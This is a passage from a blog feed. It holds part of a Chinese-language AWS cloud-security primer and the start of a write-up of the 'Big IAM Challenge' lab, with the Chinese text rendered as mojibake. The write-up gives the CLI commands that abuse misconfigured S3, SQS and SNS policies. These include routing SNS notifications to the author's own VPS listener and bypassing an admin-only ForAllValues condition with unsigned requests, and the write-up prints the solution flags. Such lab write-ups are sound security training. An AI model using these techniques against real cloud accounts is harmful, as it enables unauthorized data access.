keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/plain; charset=UTF-8</span></span><span class="token header"><span class="token header-name keyword">x-amz-sns-message-type</span><span class="token punctuation">:</span> <span class="token header-value">SubscriptionConfirmation</span></span><span class="token header"><span class="token header-name keyword">x-amz-sns-message-id</span><span class="token punctuation">:</span> <span class="token header-value">79569c97-d38d-40e3-8447-7678994a8807</span></span><span class="token header"><span class="token header-name keyword">x-amz-sns-topic-arn</span><span class="token punctuation">:</span> <span class="token header-value">arn:aws:sns:us-east-1:000000000000:MyTopic</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">1171</span></span>&#123;"Type": "SubscriptionConfirmation", "MessageId": "79569c97-d38d-40e3-8447-7678994a8807", "TopicArn": "arn:aws:sns:us-east-1:000000000000:MyTopic", "Message": "You have chosen to subscribe to the topic arn:aws:sns:us-east-1:000000000000:MyTopic.\nTo confirm the subscription, visit the SubscribeURL included in this message.", "Timestamp": "2025-08-29T03:14:11.585Z", "Token": "75732d656173742d312ff0d80c59f0d80c59f0d80c59f0d80c59f0d80c59f0d8", "SubscribeURL": "http://localhost.localstack.cloud:4566/?Action=ConfirmSubscription&amp;TopicArn=arn:aws:sns:us-east-1:000000000000:MyTopic&amp;Token=75732d656173742d312ff0d80c59f0d80c59f0d80c59f0d80c59f0d80c59f0d8", "SignatureVersion": "1", "Signature": "agiodi/j5SRUu13tURtpKl+YborNOE9V2SLfNviwRnG7JOPOrdCNl2SMEmlzr+qEBC6APv+2wAVg2UiQu1pYpXzTn4WW4pdDd00fqi4elq7rTPm4wEAfcytR9akdfE/dxnz/Ti2ziAjNGMLHW0vHMFcXyvNHzEr6ylTDQ7X8Nod5J8FW7czdZo3IVDkDY5Bz3u4skWATHtgtmI1dD8fMapCAs04aX9pBF690UN6MngwvAOKNE42n0K56T+sWFL2sAzzbZzX3hQ8ubE6crKAAQ4hi8IgI1u9+evbyr0W0F0UeFlrfi8AN0x4d74J54gx0Lb/T1MBeR4vdz9+r2GfiYA==", "SigningCertURL": "http://localhost.localstack.cloud:4566/_aws/sns/SimpleNotificationService-6c6f63616c737461636b69736e696365.pem"&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨è¿›è¡Œ Subscribe æ—¶ï¼Œå¦‚æœå½“å‰å’Œè®¢é˜…çš„ä¸»é¢˜ä¸åœ¨ä¸€ä¸ª AWS è´¦å·ä¸‹ï¼Œè¿˜éœ€è¦è¿›è¡Œ<strong>ç¡®è®¤è®¢é˜…</strong>æ“ä½œï¼Œåœ¨è¿›è¡Œç¡®è®¤æ“ä½œçš„æ—¶å€™ï¼Œå°±éœ€è¦ä½¿ç”¨ä¸»é¢˜è¿”å›çš„ Token å€¼äº†</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws sns confirm-subscription <span class="token punctuation">\</span>    --topic-arn arn:aws:sns:us-east-1:000000000000:MyTopic <span class="token punctuation">\</span>    <span class="token parameter variable">--token</span> 75732d656173742d312ff0d80c59f0d80c59f0d80c59f0d80c59f0d80c59f0d8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/08/28/%E4%BA%91%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/IMG-20250829111937678.png"></p><hr><h2 id="Cognito"><a href="#Cognito" class="headerlink" title="Cognito"></a>Cognito</h2><p>AWS Cognito æ˜¯ä¸€é¡¹æ‰˜ç®¡æœåŠ¡ï¼Œå¯å¸®åŠ©å¼€å‘äººå‘˜è½»æ¾æ·»åŠ ç”¨æˆ·èº«ä»½éªŒè¯å’ŒæˆæƒåŠŸèƒ½åˆ°åº”ç”¨ç¨‹åºä¸­ã€‚å®ƒæä¾›äº†ç”¨äºæ³¨å†Œã€ç™»å½•å’Œç®¡ç†ç”¨æˆ·çš„åŠŸèƒ½ï¼Œæ”¯æŒå¸¸è§çš„èº«ä»½éªŒè¯æ–¹æ³•ï¼Œå¦‚ç”¨æˆ·å&#x2F;å¯†ç ã€ç¤¾äº¤åª’ä½“ç™»å½•å’Œèº«ä»½æä¾›å•†é›†æˆã€‚Cognito è¿˜æä¾›äº†ç”¨æˆ·èº«ä»½éªŒè¯çš„å®‰å…¨æ€§ã€å¯ä¼¸ç¼©æ€§å’Œå¯å®šåˆ¶æ€§ï¼Œå¹¶ä¸å…¶ä»– AWS æœåŠ¡é›†æˆï¼Œä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿæ„å»ºå®‰å…¨å¯é çš„åº”ç”¨ç¨‹åºã€‚</p><p>æ–‡æ¡£ï¼š<a href="https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/cognito-identity.html">https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/cognito-identity.html</a></p><p>è¦ä½¿ç”¨ Cognito éœ€è¦åœ¨<a href="https://ap-southeast-2.signin.aws.amazon.com/oauth?client_id=arn:aws:signin:::console/cognito&code_challenge=pSNVOgzQXR9_5t2HlQt3ScnWByHQxZgfM8t2x4pRf0U&code_challenge_method=SHA-256&response_type=code&redirect_uri=https://console.aws.amazon.com/cognito?hashArgs=%2523&isauthcode=true&oauthStart=1756458425672&state=hashArgsFromTB_ap-southeast-2_39a6454693831963">æ§åˆ¶å°</a>å…ˆåˆ›å»ºä¸€ä¸ª Amazon Cognito èº«ä»½æ± ï¼Œç„¶åå¡«å…¥åˆ›å»ºçš„èº«ä»½æ±  ID å»è°ƒç”¨ SDK è·å–ä¸´æ—¶å‡­è¯ï¼Œæœ€åé€šè¿‡ä¸´æ—¶å‡­è¯å»æ“ä½œèµ„æº</p><p>è°ƒç”¨ SDK çš„éƒ¨åˆ†ä»¥ javascript ä¸ºä¾‹ï¼š<a href="https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/getting-credentials.html">https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/getting-credentials.html</a></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Set the region where your identity pool exists (us-east-1, eu-west-1)</span><span class="token constant">AWS</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>region <span class="token operator">=</span> <span class="token string">'us-east-1'</span><span class="token punctuation">;</span><span class="token comment">// Configure the credentials provider to use your identity pool</span><span class="token constant">AWS</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>credentials <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AWS<span class="token punctuation">.</span>CognitoIdentityCredentials</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">IdentityPoolId</span><span class="token operator">:</span> <span class="token string">'IDENTITY_POOL_ID'</span><span class="token punctuation">,</span>    <span class="token literal-property property">Logins</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token comment">// optional tokens, used for authenticated login</span>        <span class="token string-property property">'graph.facebook.com'</span><span class="token operator">:</span> <span class="token string">'FBTOKEN'</span><span class="token punctuation">,</span>        <span class="token string-property property">'www.amazon.com'</span><span class="token operator">:</span> <span class="token string">'AMAZONTOKEN'</span><span class="token punctuation">,</span>        <span class="token string-property property">'accounts.google.com'</span><span class="token operator">:</span> <span class="token string">'GOOGLETOKEN'</span><span class="token punctuation">,</span>        <span class="token string-property property">'appleid.apple.com'</span><span class="token operator">:</span> <span class="token string">'APPLETOKEN'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Make the call to obtain credentials</span><span class="token constant">AWS</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// Credentials will be available when this function is called.</span>    <span class="token keyword">var</span> accessKeyId <span class="token operator">=</span> <span class="token constant">AWS</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>accessKeyId<span class="token punctuation">;</span>    <span class="token keyword">var</span> secretAccessKey <span class="token operator">=</span> <span class="token constant">AWS</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>secretAccessKey<span class="token punctuation">;</span>    <span class="token keyword">var</span> sessionToken <span class="token operator">=</span> <span class="token constant">AWS</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>credentials<span class="token punctuation">.</span>sessionToken<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±äºæˆ‘è¿™é‡Œæ²¡æœ‰æ³¨å†Œ awsï¼Œå®é™…æ“ä½œå¯è§ <a href="https://c1oudfl0w0.github.io/blog/2025/08/27/The-Big-IAM-Challenge/#Do-I-know-you?">The-Big-IAM-Challenge Do I know you?</a></p><h3 id="sts"><a href="#sts" class="headerlink" title="sts"></a>sts</h3><p>Security Token Service (STS) å®‰å…¨ä»¤ç‰ŒæœåŠ¡å…è®¸è¯·æ±‚ä¸€ä¸ªæœ‰é™æƒé™çš„å‡­æ®</p><p>aws-cli æ–‡æ¡£ï¼š<a href="https://docs.aws.amazon.com/cli/latest/reference/sts/#cli-aws-sts">https://docs.aws.amazon.com/cli/latest/reference/sts/#cli-aws-sts</a></p><h4 id="assume-role-with-web-identity"><a href="#assume-role-with-web-identity" class="headerlink" title="assume-role-with-web-identity"></a>assume-role-with-web-identity</h4><blockquote><p>è¿”å›ä¸€ç»„ä¸´æ—¶å®‰å…¨å‡­è¯ï¼Œç”¨äºå·²åœ¨ç§»åŠ¨ç«¯æˆ– Web åº”ç”¨ç¨‹åºä¸­é€šè¿‡äº† Web èº«ä»½æä¾›å•†è¿›è¡Œèº«ä»½éªŒè¯çš„ç”¨æˆ·</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">assume-role-with-web-identity <span class="token punctuation">\</span>--role-arn <span class="token operator">&lt;</span>value<span class="token operator">></span> <span class="token punctuation">\</span>--role-session-name <span class="token operator">&lt;</span>value<span class="token operator">></span> <span class="token punctuation">\</span>--web-identity-token <span class="token operator">&lt;</span>value<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸‰ä¸ªå‚æ•°ï¼š</p><ul><li><code>role-arn</code>ï¼šå³ arn é‚£ä¸²ï¼Œè°ƒç”¨è€…æ‰€æ‰¿æ‹…çš„è§’è‰²çš„ Amazon èµ„æºåç§° (ARN)</li><li><code>role-session-name</code>ï¼šå¯ä»¥è‡ªå®šä¹‰</li><li><code>web-identity-token</code>ï¼šèº«ä»½æä¾›å•†æä¾›çš„ OAuth 2.0 è®¿é—®ä»¤ç‰Œæˆ– OpenID Connect ID ä»¤ç‰Œï¼Œéœ€è¦ä»èº«ä»½æ±  ID è·å–</li></ul><p>è·å– token å¯ä»¥æŸ¥çœ‹ aws-cli æ–‡æ¡£ï¼š <a href="https://docs.aws.amazon.com/de_de/cli/latest/reference/cognito-identity/index.html">https://docs.aws.amazon.com/de_de/cli/latest/reference/cognito-identity/index.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://wiki.teamssix.com/CloudService/&quot;&gt;https://wiki.teamssix.com/CloudService/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/bfengj/Cloud-Security?tab=readme-ov-file&quot;&gt;https://github.com/bfengj/Cloud-Security?tab=readme-ov-file&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://lzcloudsecurity.gitbook.io/yun-an-quan-gong-fang-ru-men/&quot;&gt;https://lzcloudsecurity.gitbook.io/yun-an-quan-gong-fang-ru-men/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="äº‘å®‰å…¨" scheme="http://c1oudfl0w0.github.io/blog/tags/%E4%BA%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>The Big IAM Challenge</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/08/27/The-Big-IAM-Challenge/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/08/27/The-Big-IAM-Challenge/</id>
    <published>2025-08-27T10:01:02.000Z</published>
    <updated>2025-09-10T01:36:27.307Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250830005022246.png"></p><p>å…¥é—¨çº§é¶åœº</p><p>é¶åœºåœ°å€ï¼š<a href="https://bigiamchallenge.com/challenge/1">https://bigiamchallenge.com/challenge/1</a></p><p>å‚è€ƒï¼š</p><p><a href="https://wiki.teamssix.com/cloudservice/iam/the_big_iam_challenge_writeup.html">https://wiki.teamssix.com/cloudservice/iam/the_big_iam_challenge_writeup.html</a></p><p><a href="https://pswalia2u.medium.com/bigiamchallenge-aws-iam-challenges-ded45cb983f2">https://pswalia2u.medium.com/bigiamchallenge-aws-iam-challenges-ded45cb983f2</a></p><span id="more"></span><hr><h1 id="Buckets-of-Fun"><a href="#Buckets-of-Fun" class="headerlink" title="Buckets of Fun"></a>Buckets of Fun</h1><p>policyï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span>            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"s3:GetObject"</span><span class="token punctuation">,</span>            <span class="token property">"Resource"</span><span class="token operator">:</span> <span class="token string">"arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span>            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"s3:ListBucket"</span><span class="token punctuation">,</span>            <span class="token property">"Resource"</span><span class="token operator">:</span> <span class="token string">"arn:aws:s3:::thebigiamchallenge-storage-9979f4b"</span><span class="token punctuation">,</span>            <span class="token property">"Condition"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"StringLike"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"s3:prefix"</span><span class="token operator">:</span> <span class="token string">"files/*"</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»ç­–ç•¥é‡Œå¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªæ¡¶å¯¹æ‰€æœ‰äººæœ‰å…¬å¼€åˆ—å¯¹è±¡å’Œå…¬å¼€è¯»å–çš„æƒé™</p><p>é‚£ä¹ˆç›´æ¥è®¿é—®è¿™ä¸ª bucketï¼š<a href="https://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com/">https://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com</a></p><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250828113351191.png"></p><p>å¯ä»¥çœ‹åˆ° bucket ä¸­çš„ keyï¼Œè®¿é—®è¿™ä¸ª key å³å¯å¾—åˆ° flag</p><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250828113521969.png"></p><p>flagï¼š <code>&#123;wiz:exposed-storage-risky-as-usual&#125;</code></p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ aws-cli æ¥è·å–</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws s3 <span class="token function">ls</span> s3://thebigiamchallenge-storage-9979f4b/files/ --no-sign-requestaws s3 <span class="token function">cp</span> s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt /tmp/ --no-sign-request<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250828113737169.png"></p><hr><h1 id="Google-Analytics"><a href="#Google-Analytics" class="headerlink" title="Google Analytics"></a>Google Analytics</h1><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span>            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"sqs:SendMessage"</span><span class="token punctuation">,</span>                <span class="token string">"sqs:ReceiveMessage"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"Resource"</span><span class="token operator">:</span> <span class="token string">"arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ª Policy æˆäºˆäº†æ‰€æœ‰äººæ‹¥æœ‰è¿™ä¸ª SQS é˜Ÿåˆ—çš„å‘é€ã€æ¥æ”¶æ¶ˆæ¯çš„æƒé™ã€‚</p><p>é‚£ä¹ˆè¿™é‡Œå°è¯• receive messageï¼Œè°ƒç”¨æ¥å£ï¼ŒQueue URL ç”± policy å¯çŸ¥Â Account ID å’Œ Queueï¼Œç»„æˆ <code>/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2</code></p><p>ç›´æ¥åœ¨ challenge æä¾›çš„ aws-cli è¿™é‡Œæ‰§è¡Œå‘½ä»¤ï¼Œæœ¬åœ°çš„è¯è¿˜éœ€è¦é…ç½® profile</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws sqs receive-message --queue-url http://queue.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250828162025463.png"></p><p>å“åº”ä¸­å‡ºç°äº†ä¸€ä¸ª url åœ°å€ï¼Œè®¿é—®å¾—åˆ° flagï¼š<code>&#123;wiz:you-are-at-the-front-of-the-queue&#125;</code></p><hr><h1 id="Enable-Push-Notifications"><a href="#Enable-Push-Notifications" class="headerlink" title="Enable Push Notifications"></a>Enable Push Notifications</h1><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2008-10-17"</span><span class="token punctuation">,</span>    <span class="token property">"Id"</span><span class="token operator">:</span> <span class="token string">"Statement1"</span><span class="token punctuation">,</span>    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"Sid"</span><span class="token operator">:</span> <span class="token string">"Statement1"</span><span class="token punctuation">,</span>            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"AWS"</span><span class="token operator">:</span> <span class="token string">"*"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"SNS:Subscribe"</span><span class="token punctuation">,</span>            <span class="token property">"Resource"</span><span class="token operator">:</span> <span class="token string">"arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications"</span><span class="token punctuation">,</span>            <span class="token property">"Condition"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"StringLike"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"sns:Endpoint"</span><span class="token operator">:</span> <span class="token string">"*@tbic.wiz.io"</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ª Policy å…è®¸ Endpoint ç»“å°¾æ˜¯ <code>@tbic.wiz.io</code> çš„äººæ‹¥æœ‰è¿™ä¸ª SNS æœåŠ¡çš„ Subscribe æƒé™</p><p>é‚£ä¹ˆå¾ˆæ˜æ˜¾æˆ‘ä»¬ä¸èƒ½ç”¨é‚®ç®±è¿›è¡Œè®¢é˜…ï¼Œä¸è¿‡ http åè®®ä¹Ÿæ˜¯æ”¯æŒ url ä¸­å‡ºç° <code>@</code> ä¸”ä¸å½±å“ host è§£æçš„ï¼Œäºæ˜¯åœ¨è‡ªå·±çš„ vps ä¸Šèµ·ä¸ª nc</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications <span class="token parameter variable">--protocol</span> http --notification-endpoint http://vps:23333/@tbic.wiz.io<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250829112645576.png"></p><p>å¦ä¸€è¾¹æ”¶åˆ°è¯·æ±‚</p><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250829114842984.png"></p><p>å¤åˆ¶è¿™é‡Œçš„ token ï¼Œè®¤è¯è®¢é˜…</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws sns confirm-subscription --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications <span class="token parameter variable">--token</span> 2336412f37fb687f5d51e6e2425a8a587855b1e0f1dd023310f0af6326f154b97ce60ee6b9cea0c2c555b3bc8622783c342f235a4266eb8c6965d53ff3c85fa188ee34fa175142477130823c9274b4899d18742dc383fc342e8537237c91820886843dd1a88c0070fef17e3133b7ee3c0553f983edf108ab1fa48f370b1e0ca8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½†æ˜¯æˆ‘è¿™é‡Œ aws-cli æŠ¥é”™äº†æ²¡æˆåŠŸï¼Œé‡‡ç”¨å¦å¤–ä¸€ç§åŠæ³•ï¼Œç›´æ¥è®¿é—® SubscribeURLï¼Œç»§ç»­ç›‘å¬ç«¯å£ï¼Œè¿‡ä¼šå°±ä¼šæ¥åˆ° message äº†</p><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250829114800902.png"></p><p>flagï¼š<code>&#123;wiz:always-suspect-asterisks&#125;</code></p><p>åšå®Œè®°å¾—å–æ¶ˆè®¢é˜…ï¼Œåªéœ€è¦è®¿é—®ä¸‹è¿”å›çš„ UnsubscribeURL å³å¯</p><hr><h1 id="Admin-only"><a href="#Admin-only" class="headerlink" title="Admin only?"></a>Admin only?</h1><p>policyï¼š</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"Version"</span><span class="token operator">:</span> <span class="token string">"2012-10-17"</span><span class="token punctuation">,</span>    <span class="token property">"Statement"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span>            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"s3:GetObject"</span><span class="token punctuation">,</span>            <span class="token property">"Resource"</span><span class="token operator">:</span> <span class="token string">"arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"Effect"</span><span class="token operator">:</span> <span class="token string">"Allow"</span><span class="token punctuation">,</span>            <span class="token property">"Principal"</span><span class="token operator">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span>            <span class="token property">"Action"</span><span class="token operator">:</span> <span class="token string">"s3:ListBucket"</span><span class="token punctuation">,</span>            <span class="token property">"Resource"</span><span class="token operator">:</span> <span class="token string">"arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321"</span><span class="token punctuation">,</span>            <span class="token property">"Condition"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"StringLike"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"s3:prefix"</span><span class="token operator">:</span> <span class="token string">"files/*"</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token property">"ForAllValues:StringLike"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"aws:PrincipalArn"</span><span class="token operator">:</span> <span class="token string">"arn:aws:iam::133713371337:user/admin"</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¾æ—§æ˜¯ s3 å­˜å‚¨æ¡¶ï¼Œæ€è·¯è¿˜æ˜¯æ‰¾åˆ° flag çš„ keyï¼Œç„¶åè®¿é—®åœ°å€å³å¯</p><p>ä½†æ˜¯è¿™é‡Œçš„ Condition å¯¹åˆ—å¯¹è±¡åšäº†é™åˆ¶ï¼Œåªå¯¹ <code>arn:aws:iam::133713371337:user/admin</code> ä¸»ä½“æˆäºˆäº† ListBucket æƒé™</p><p>æ³¨æ„è¿™é‡Œçš„ ForAllValuesï¼Œå®˜æ–¹æ–‡æ¡£ï¼š<a href="https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_condition_examples-multi-valued-context-keys.html">https://docs.aws.amazon.com/zh_cn/IAM/latest/UserGuide/reference_policies_condition_examples-multi-valued-context-keys.html</a></p><blockquote><p>å¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰ä¸Šä¸‹æ–‡é”®ï¼Œ<code>ForAllValues</code>Â é›†åˆè¿ç®—ç¬¦ä¹Ÿä¼šè¿”å› trueã€‚</p></blockquote><p>æ‰€ä»¥ä¸è¦ä½¿ç”¨å¸¦æœ‰ Allow æ•ˆæœçš„ ForAllValuesï¼Œå› ä¸ºè¿™æ ·å¯èƒ½ä¼šè¿‡äºå®½å®¹ï¼Œå»ºè®®ä½¿ç”¨ ForAnyValueï¼Œç©ºå€¼æ—¶ä¼šè¿”å› false</p><p>å¦‚æœæˆ‘ä»¬æŠŠè¯·æ±‚ä¸­çš„ aws:PrincipalArn ç½®ç©ºï¼Œè¿™é‡Œå°±ä¼šè¿”å› Trueï¼Œé‚£ä¹ˆå°±å¯ä»¥ç»•è¿‡äº†</p><p>åœ¨ aws-cli ä¸­ï¼Œç½®ç©º aws:PrincipalArn çš„æ–¹æ³•æ˜¯å¸¦ä¸Š <code>--no-sign-request</code> å‚æ•°</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">aws s3api list-objects <span class="token parameter variable">--bucket</span> thebigiamchallenge-admin-storage-abf1321 <span class="token parameter variable">--prefix</span> <span class="token string">'files/'</span> --no-sign-request<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2025/08/27/The-Big-IAM-Challenge/IMG-20250829152941101.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬å°±åˆ—å‡ºå­˜å‚¨æ¡¶é‡Œçš„å¯¹è±¡äº†ï¼Œç›´æ¥è®¿é—® flag 